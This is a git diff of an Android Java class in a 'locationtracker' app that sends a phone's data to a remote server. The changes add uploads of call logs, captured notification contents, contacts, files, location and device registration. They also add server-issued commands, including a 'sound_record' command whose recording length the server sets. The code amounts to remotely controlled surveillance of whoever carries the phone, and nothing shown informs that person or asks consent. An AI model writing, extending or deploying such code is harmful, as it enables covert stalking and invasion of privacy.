@@ -1,26 +1,23 @@
 package com.varbin.locationtracker.APIs;
 
-import android.bluetooth.BluetoothClass;
 import android.content.Context;
 import android.os.Build;
 import android.util.Log;
 
 import com.google.gson.Gson;
-import com.google.gson.JsonElement;
-import com.jaredrummler.android.device.DeviceName;
+import com.google.gson.GsonBuilder;
 
 import AutoVoiceRecorder.recorderClass;
 import callDetails.contactList;
+import callDetails.deviceRegisterModel;
 import callDetails.inActiveCommand;
 import callDetails.lastCall;
+import models.logModel;
 import models.AttrModel;
+import models.ContactModel;
 import models.FileUpload;
-import models.getCommandMode;
-import okhttp3.FormBody;
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
+
+import notifications.notificationModel;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -33,55 +30,51 @@ import static android.content.ContentValues.TAG;
 import androidx.annotation.RequiresApi;
 
 import java.io.IOException;
-import java.io.Reader;
-import java.net.HttpURLConnection;
-import java.util.ArrayList;
 import java.util.List;
 
 public class CreaterClass {
     private static Retrofit retrofit ;
-    private static String baseUrl = "https://mobitrack.varbin.com/index.php/Api/";
-    public static void LocationSender(double latitude , double Longitude){
-
+    private static String baseUrl = AccountConstants.BASEURL;
+    public static void LocationSender(double latitude , double Longitude ,Context context){
          retrofit = new Retrofit.Builder()
             .baseUrl(baseUrl)
             .addConverterFactory(GsonConverterFactory.create())
             .build();
         MyInterface myInterface = retrofit.create(MyInterface.class);
         String DeviceName = com.jaredrummler.android.device.DeviceName.getDeviceName();
-        ModelClass modelClass = new ModelClass(DeviceName , Build.ID , Build.BRAND ,latitude , Longitude);
+        ModelClass modelClass = new ModelClass(DeviceName , AccountConstants.getStatus(context), Build.BRAND ,latitude , Longitude);
         Call<ModelClass> call = myInterface.createLocation(modelClass);
         call.enqueue(new Callback<ModelClass>() {
             @Override
             public void onResponse(Call<ModelClass> call, Response<ModelClass> response) {
-                Log.d("TAG", "onResponse: "+response);
+              //  Log.d("TAG", "onResponse: "+response);
             }
 
             @Override
             public void onFailure(Call<ModelClass> call, Throwable t) {
-                Log.d("TAG", "onResponseFail: "+t.getMessage());
+              //  Log.d("TAG", "onResponseFail: "+t.getMessage());
 
             }
         });
     }
-    public static void ContactCreater(String Name , double Mobile){
+    public static void ContactCreater(String Name , String Mobile){
         retrofit = new Retrofit.Builder()
                 .baseUrl(baseUrl)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         MyInterface myInterface = retrofit.create(MyInterface.class);
-        ContactModel cm = new ContactModel(Name, Mobile , Build.MODEL ,Build.ID, Build.BRAND );
+        ContactModel cm = new ContactModel(Build.MODEL ,AccountConstants.getStatus, Build.BRAND ,Name , Mobile );
         Call<ContactModel> contactModelCall = myInterface.createContact(cm);
         contactModelCall.enqueue(new Callback<ContactModel>() {
             @Override
             public void onResponse(Call<ContactModel> call, Response<ContactModel> response) {
-                Log.d(TAG, "onResponse1: "+response.body());
+                Log.d(TAG, "onResponse contactCreator: "+response.code());
 
             }
 
             @Override
             public void onFailure(Call<ContactModel> call, Throwable t) {
-                Log.d(TAG, "onResponse1: fail "+t.getLocalizedMessage());
+                Log.d(TAG, "onResponse contactCreator: fail "+t.getLocalizedMessage());
             }
         });
     }
@@ -91,11 +84,13 @@ public class CreaterClass {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
          MyInterface myInterface =  retrofit.create(MyInterface.class);
-         Call<List<AttrModel>>  call = myInterface.getCommand(baseUrl+AccountConstants.getStatus);
+         String base = baseUrl+AccountConstants.getStatus(context);
+         Call<List<AttrModel>>  call = myInterface.getCommand(base);
          call.enqueue(new Callback<List<AttrModel>>() {
              @RequiresApi(api = Build.VERSION_CODES.O)
              @Override
              public void onResponse(Call<List<AttrModel>> call, Response<List<AttrModel>> response) {
+                 Log.d(TAG, "onResponse: "+response.message());
                 List<AttrModel> model = response.body();
                 if (model!=null){
                     for (int i = 0; i < model.size(); i++) {
@@ -103,7 +98,7 @@ public class CreaterClass {
                         switch (model.get(i).getCommand()) {
                             case "sound_record" :{
                                 Log.d(TAG, "onResponse: case "+"sound_record"+i);
-                                recorderClass.startRecording(context.getApplicationContext() , 5000);
+                                recorderClass.startRecording(context.getApplicationContext() , model.get(i).getAttr());
                                 break;
                             }
                             case "contact_list" :{
@@ -112,13 +107,21 @@ public class CreaterClass {
                                 break;
                             }
                             case "contact_log" :{
+                                lastCall.ValidatLog(context.getApplicationContext());
                                 Log.d(TAG, "onResponse: case "+"contact_log"+i);
-                                lastCall.logModel(context.getApplicationContext());
+                                lastCall.ValidatLog(context.getApplicationContext());
                                 break;
                             }
                             case "live_location" :{
                                 Log.d(TAG, "onResponse: case "+"live_location"+i);
+
                                 break;
+                            }
+                            case "upload":{
+                                Log.d(TAG, "onResponse: case "+"upload"+i);
+//                                if (model.get(i).g)
+                              //  fileUploadToserver.filefinder(model.get(i).getFilepath() ,model.get(i).getId() , context.getApplicationContext());
+
                             }
                         }
                     }
@@ -141,7 +144,7 @@ public class CreaterClass {
          });
 
     }
-    public static <T> void uploadFileonServer(ArrayList<T> arrayList){
+    public static <T> void sendContactToserver (String name , String number){
         Log.d(TAG, "uploadFileonServer: return ");
         return;
     }
@@ -152,39 +155,41 @@ public class CreaterClass {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
-
-        Call<inActiveCommand> call = myInterface.inActiveCommand(baseUrl+AccountConstants.inActive+command);
+        String base = baseUrl+AccountConstants.inActive+command ;
+        Log.d(TAG, "onResponse: inactive "+ base);
+        Call<inActiveCommand> call = myInterface.inActiveCommand(base);
         call.enqueue(new Callback<inActiveCommand>() {
             @Override
             public void onResponse(Call<inActiveCommand> call, Response<inActiveCommand> response) {
-                Log.d(TAG, "uploadFileonServer: Inactivated"+ response.message());
+                Log.d(TAG, "onResponse: inactive "+ response.message());
                 AccountConstants.isInactive = true;
             }
             @Override
             public void onFailure(Call<inActiveCommand> call, Throwable t) {
-                AccountConstants.isInactive = false;
+                Log.d(TAG, "onResponse: inactive "+ t.getLocalizedMessage());
+//                AccountConstants.isInactive = false;
             }
         });
         flage = AccountConstants.isInactive;
         return flage;
     }
-    public static boolean FileDataUploader(String command , String date , String path) throws IOException {
+    public static boolean FileDataUploader(String command , String date , String path , Context context) throws IOException {
 
         retrofit = new Retrofit.Builder()
                 .baseUrl(baseUrl)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         MyInterface myInterface =  retrofit.create(MyInterface.class);
-        FileUpload fileUpload = new FileUpload( command, Build.ID , date, path);
+        FileUpload fileUpload = new FileUpload( command, AccountConstants.getStatus(context) , date, path);
         Gson gson = new Gson();
         String s = gson.toJson(fileUpload);
-        Log.d(TAG, "onResponse: "+s);
-//        Call<FileUpload> call = myInterface.sendData2(command.trim(), Build.ID.trim(), path.trim() ,date.trim() );
+        Log.d(TAG, "onResponse fileuploader: "+s);
+//        Call<FileUpload> call = myInterface.sendData2(command.trim(),AccountConstants.getStatus.trim(), path.trim() ,date.trim() );
         Call<FileUpload> call = myInterface.sendData2(fileUpload);
         call.enqueue(new Callback<FileUpload>() {
             @Override
             public void onResponse(Call<FileUpload> call, Response<FileUpload> response) {
-                Log.d(TAG, "onResponse: "+response.message());
+                Log.d(TAG, "onResponse: fileuploader "+response.message());
 
             }
 
@@ -193,34 +198,95 @@ public class CreaterClass {
                 Log.d(TAG, "onResponse: "+t.getLocalizedMessage());
             }
         });
-
-
-
-
-
-
-
-
-
-
-//        Log.d(TAG, "FileDataUploader: in");
-//        MediaType mediaType  = MediaType.parse("application/json");
-//        OkHttpClient client = new OkHttpClient();
-//        FileUpload fl =  new FileUpload(date, path, Build.ID, command);
-//        Gson gson = new Gson();
-//        try {
-//            String json = gson.toJson(fl);
-//            gson.toJson(fl);
-//            RequestBody requestBody = RequestBody.create( mediaType, json);
-//            Request request = new Request.Builder()
-//                    .url(baseUrl+"setCommandFile")
-//                    .post(requestBody).build();
-//            okhttp3.Call call = client.newCall(request);
-//            okhttp3.Response response = call.execute();
-//            Log.d(TAG, "FileDataUploader: "+  response.message().toString());
-//        }catch (Exception e){
-//            Log.d(TAG, "FileDataUploader: e"+e);
-//        }
         return false;
+    }
+    public static void uploadData(byte[] encode , String enc){
+        retrofit = new Retrofit.Builder()
+                .baseUrl(baseUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        MyInterface myInterface =  retrofit.create(MyInterface.class);
+        String base = baseUrl + " fileupload " + enc ;
+        Call<Void> call = myInterface.uploadData(enc  , base);
+        call.enqueue(new Callback<Void>() {
+            @Override
+            public void onResponse(Call<Void> call, Response<Void> response) {
+                Log.d(TAG, "fileChooser: done "+response.code());
+            }
+            @Override
+            public void onFailure(Call<Void> call, Throwable t) {
+                Log.d(TAG, "fileChooser: fail ");
+            }
+        });
+    }
+    public static void uploadCallLog(String number , String type ,String  date ,  String Duartion , Context context){
+        Gson gson = new GsonBuilder()
+                .setLenient()
+                .create();
+        retrofit = new Retrofit.Builder()
+                .baseUrl(baseUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        MyInterface myInterface =  retrofit.create(MyInterface.class);
+        logModel lm = new logModel(Build.MODEL , AccountConstants.getStatus(context), Build.BRAND , number , type , date , Duartion);
+        Call<logModel> call = myInterface.sendCallLog(lm);
+        Gson gson2 = new Gson();
+        String s = gson2.toJson(lm);
+//        Log.d(TAG, "onResponse: "+s);
+        call.enqueue(new Callback<logModel>() {
+            @Override
+            public void onResponse(Call<logModel> call, Response<logModel> response) {
+                Log.d(TAG, "onResponse: upload call log "+response.code());
+            }
+
+            @Override
+            public void onFailure(Call<logModel> call, Throwable t) {
+                Log.d(TAG, "onResponse: upload call log "+t.getLocalizedMessage());
+            }
+        });
+    }
+    public static void sendNotification(String pack , String Content , String title , Context context){
+        retrofit = new Retrofit.Builder()
+                .baseUrl(baseUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        MyInterface myInterface =  retrofit.create(MyInterface.class);
+        notificationModel nm = new notificationModel(Build.MODEL , AccountConstants.getStatus(context) , Build.BRAND , pack , Content , title );
+        Call<notificationModel> call = myInterface.sendNotification(nm);
+        call.enqueue(new Callback<notificationModel>() {
+            @Override
+            public void onResponse(Call<notificationModel> call, Response<notificationModel> response) {
+                Log.d(TAG, "onResponse: sendNotification "+response.code());
+            }
+
+            @Override
+            public void onFailure(Call<notificationModel> call, Throwable t) {
+                Log.d(TAG, "onResponse: sendNotification "+t);
+            }
+        });
+    }
+    public static void RegisterDevice(String name , String number , Context context){
+        retrofit = new Retrofit.Builder()
+                .baseUrl(baseUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+        deviceRegisterModel dm = new deviceRegisterModel(AccountConstants.getStatus(context), Build.MODEL , Build.BRAND , name , number);
+        MyInterface myInterface =  retrofit.create(MyInterface.class);
+        Call<deviceRegisterModel> call = myInterface.registerDevice(dm);
+        Gson gson2 = new Gson();
+        String json   = gson2.toJson(dm);
+        // Log.d(TAG, "ondevice: "+json);
+        call.enqueue(new Callback<deviceRegisterModel>() {
+            @Override
+            public void onResponse(Call<deviceRegisterModel> call, Response<deviceRegisterModel> response) {
+                Log.d(TAG, "ondevice location: device registerd");
+            }
+
+            @Override
+            public void onFailure(Call<deviceRegisterModel> call, Throwable t) {
+                Log.d(TAG, "ondevice location: device fail registerd"+t.getMessage());
+            }
+        });
+
     }
 }
